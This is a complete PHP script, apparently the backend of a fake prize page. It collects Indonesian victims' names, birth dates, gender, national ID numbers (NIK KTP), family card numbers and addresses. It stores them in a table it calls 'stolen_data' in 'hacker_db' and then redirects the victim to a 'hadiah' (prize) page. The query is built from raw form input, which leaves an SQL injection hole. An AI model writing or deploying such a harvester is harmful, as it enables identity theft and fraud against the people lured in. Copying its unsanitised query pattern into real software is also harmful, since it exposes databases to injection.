<?php
// File: save.php
session_start();
$conn = new mysqli("localhost", "root", "", "hacker_db");

// Data dari form
$data = [
    'nama_depan' => $_POST['nama_depan'],
    'nama_belakang' => $_POST['nama_belakang'],
    'tanggal_lahir' => $_POST['tanggal_lahir'],
    'gender' => $_POST['gender'],
    'nik_ktp' => $_POST['nik_ktp'],
    'nik_kk' => $_POST['nik_kk'],
    'alamat' => $_POST['alamat']
];

// Simpan ke database
$sql = "INSERT INTO stolen_data 
        (nama_depan, nama_belakang, tanggal_lahir, gender, nik_ktp, nik_kk, alamat) 
        VALUES (
            '{$data['nama_depan']}',
            '{$data['nama_belakang']}',
            '{$data['tanggal_lahir']}',
            '{$data['gender']}',
            '{$data['nik_ktp']}',
            '{$data['nik_kk']}',
            '{$data['alamat']}'
        )";

$conn->query($sql);
$conn->close();

// Redirect ke halaman hadiah
header("Location: hadiah.php");
exit();